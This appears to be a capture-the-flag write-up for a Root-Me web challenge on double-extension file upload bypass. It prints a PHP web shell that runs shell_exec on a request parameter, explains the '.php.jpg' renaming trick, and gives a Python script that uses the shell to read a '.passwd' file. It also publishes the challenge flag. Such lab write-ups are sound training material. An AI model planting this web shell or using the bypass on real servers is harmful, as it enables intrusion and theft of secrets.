---
title: File upload - Double extensions
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, rootme]
---

* Points: 20
* Link: [https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

## Statement

> Your goal is to hack this photo galery by uploading PHP code.
>
> Retrieve the validation password in the file .passwd at the root of the application.

## Solution

Just write a normal php code

```php
<?php
$command = $_GET['command'];
$output = shell_exec($command);
echo "<p> $output <p>";
?>
```
{: file="exploitit.php" }

Then change its name to ```exploitit.php.jpg``` and upload to server.

Then call it by

```py
import requests

URL =  'http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/694193751d4a423a2179aadef22b5be4/exploitit.php.jpg?command={}'

command = "cd ../../../; cat .passwd"

r = requests.get(URL.format(command))
print(r.text)
```

Note that ```.passwd``` is at challenge's root, not system's root, so ```cat /.passwd``` wont work!

The flag is
```
Gg9LRz-hWSxqqUKd77-_q-6G8
```